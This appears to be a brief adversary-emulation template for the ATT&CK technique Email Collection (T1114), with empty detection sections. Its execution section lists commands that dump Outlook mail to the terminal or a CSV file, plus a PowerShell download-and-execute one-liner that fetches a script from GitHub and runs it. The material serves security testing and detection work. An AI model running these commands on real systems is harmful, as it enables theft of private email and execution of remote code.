Technique Description: Email Collection (T1114)
------------------------------------
Attackers may steal emails to collect sensitive information about their target. They may target email applications like Outlook.

Assumptions 
-------------

Execution
-------------
Display email contents in the terminal  PS C:\> .\Get-Inbox.ps1
Write emails out to a CSV  PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
Download and Execute  "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Get-Inbox.ps1')"

 Detection 
-------------

 Visibility 
-------------

### Filter/ Correlation Rule ###
